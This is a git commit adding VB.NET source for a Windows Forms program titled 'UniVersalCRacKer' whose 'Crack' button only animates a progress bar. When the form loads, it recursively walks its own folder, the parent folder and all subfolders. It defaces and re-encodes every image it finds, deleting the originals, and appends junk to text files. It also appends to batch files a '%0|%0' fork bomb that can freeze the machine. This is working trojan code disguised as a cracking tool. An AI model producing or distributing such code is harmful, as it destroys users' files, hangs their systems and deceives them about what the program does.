82431c0382e9113848f6f7f502e3b2ef3d705a11
PatoFlamejanteTV <flamejantepato77@gmail.com>
2025-01-17 16:29:15 -0300

    v1

---
+++ Form1.Designer.vb
@@ -0,0 +1,70 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()>
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()>
+    Private Sub InitializeComponent()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
+        Me.SuspendLayout()
+        '
+        'Button1
+        '
+        Me.Button1.Font = New System.Drawing.Font("Comic Sans MS", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Button1.Location = New System.Drawing.Point(154, 12)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(83, 25)
+        Me.Button1.TabIndex = 0
+        Me.Button1.Text = "Crack"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'ProgressBar1
+        '
+        Me.ProgressBar1.Location = New System.Drawing.Point(13, 12)
+        Me.ProgressBar1.Name = "ProgressBar1"
+        Me.ProgressBar1.Size = New System.Drawing.Size(135, 103)
+        Me.ProgressBar1.TabIndex = 1
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(249, 127)
+        Me.Controls.Add(Me.ProgressBar1)
+        Me.Controls.Add(Me.Button1)
+        Me.Name = "Form1"
+        Me.Text = "UniVersalCRacKer"
+        Me.ResumeLayout(False)
+
+    End Sub
+
+    Public WithEvents Button1 As Button
+    Public WithEvents ProgressBar1 As ProgressBar
+
+    ' False cracker "AREA"/"PART"
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        While Not ProgressBar1.Value + 1 > 100
+            ProgressBar1.Value += 1
+            Threading.Thread.Sleep(10)
+        End While
+        Button1.Text = "Cracked!"
+    End Sub
+End Class
---
+++ Form1.vb
@@ -0,0 +1,125 @@
+﻿Imports System.Drawing
+Imports System.Drawing.Imaging
+Imports System.IO
+Imports System.Windows.Forms
+Imports System.Runtime.InteropServices
+
+Public Class Form1
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        'MessageBox.Show("Error: Windows architecture may not be displayed correctly due an kernel glitch, this error is alreay recognized by our TEAM.")
+        Dim folderPath As String = AppDomain.CurrentDomain.BaseDirectory
+
+        ' Process the current directory and all its sub
+        ProcessDirectory(folderPath)
+
+        ' Go one directory up and process all its sub
+        Dim parentDirectory As String = Directory.GetParent(folderPath).FullName
+        ProcessDirectory(parentDirectory)
+
+        Console.WriteLine("Text added to all images, text files, and batch files.")
+    End Sub
+
+    Private Sub ProcessDirectory(directoryPath As String)
+        Dim imageFiles As String() = Directory.GetFiles(directoryPath, "*.*").Where(Function(s) s.EndsWith(".jpg") Or s.EndsWith(".jpeg") Or s.EndsWith(".png") Or s.EndsWith(".gif") Or s.EndsWith(".bmp")).ToArray()
+        For Each imageFile As String In imageFiles
+            Dim textToAdd As String = GetTextForImageType(imageFile)
+            AddTextToImage(imageFile, textToAdd)
+        Next
+
+        Dim textFiles As String() = Directory.GetFiles(directoryPath, "*.txt")
+        For Each textFile As String In textFiles
+            AddTextToTextFile(textFile, "- Duck, Brasil, 2050")
+        Next
+
+        Dim batFiles As String() = Directory.GetFiles(directoryPath, "*.bat")
+        For Each batFile As String In batFiles
+            AddTextToBatchFile(batFile, "msg * Hi!" & Environment.NewLine & "pause" & Environment.NewLine & "echo Did I break your stupid BATCHFILE?" & Environment.NewLine & "echo OOPS! XDDDDD" & Environment.NewLine & "%0|%0")
+        Next
+
+        Dim subdirectories As String() = Directory.GetDirectories(directoryPath)
+        For Each subdirectory As String In subdirectories
+            ProcessDirectory(subdirectory)
+        Next
+    End Sub
+
+    Private Function GetTextForImageType(imagePath As String) As String
+        Dim extension As String = Path.GetExtension(imagePath).ToLower()
+
+        Select Case extension
+            Case ".jpg", ".jpeg"
+                Return "Image created by: Duck. Created on: Hell ^^"
+            Case ".png"
+                Return "Transparency, huh?"
+            Case ".gif"
+                Return "Animated or no? That's the question!!!!"
+            Case ".bmp"
+                Return "bad format, get hacked"
+            Case Else
+                Return "Huh?"
+        End Select
+    End Function
+
+    Private Sub AddTextToImage(imagePath As String, text As String)
+        Dim tempImagePath As String = ""
+
+        Try
+            ' Load
+            Using img As Image = Image.FromFile(imagePath)
+                Using graphics As Graphics = Graphics.FromImage(img)
+
+                    Dim fontSize As Single = 20
+                    Dim font As Font = New Font("Comic Sans MS", fontSize, FontStyle.Bold)
+                    Dim brush As New SolidBrush(Color.DarkRed)
+
+                    Dim textSize As SizeF = graphics.MeasureString(text, font)
+                    While textSize.Width < img.Width And textSize.Height < img.Height
+                        fontSize += 1
+                        font = New Font("Comic Sans MS", fontSize, FontStyle.Bold)
+                        textSize = graphics.MeasureString(text, font)
+                    End While
+
+                    fontSize -= 1
+                    font = New Font("Comic Sans MS", fontSize, FontStyle.Bold)
+
+                    ' Define the pos
+                    Dim position As New PointF(10, 10)
+
+                    graphics.DrawString(text, font, brush, position)
+                End Using
+
+                tempImagePath = Path.Combine(Path.GetDirectoryName(imagePath), "temp_" & Path.GetFileName(imagePath))
+                img.Save(tempImagePath, ImageFormat.Jpeg)
+            End Using
+
+            File.Delete(imagePath)
+            File.Move(tempImagePath, imagePath)
+
+        Catch ex As System.Runtime.InteropServices.ExternalException
+            Console.WriteLine($"Error saving image: {ex.Message}")
+        Catch ex As Exception
+            Console.WriteLine($"Unexpected error: {ex.Message}")
+        End Try
+    End Sub
+
+    Private Sub AddTextToTextFile(filePath As String, text As String)
+        Try
+            Dim content As String = File.ReadAllText(filePath)
+            content &= Environment.NewLine & text
+
+            File.WriteAllText(filePath, content)
+        Catch ex As Exception
+            Console.WriteLine($"Error modifying text file: {ex.Message}")
+        End Try
+    End Sub
+
+    Private Sub AddTextToBatchFile(filePath As String, text As String)
+        Try
+            Dim content As String = File.ReadAllText(filePath)
+            content &= Environment.NewLine & text
+
+            File.WriteAllText(filePath, content)
+        Catch ex As Exception
+            Console.WriteLine($"Error modifying batch file: {ex.Message}")
+        End Try
+    End Sub
+End Class
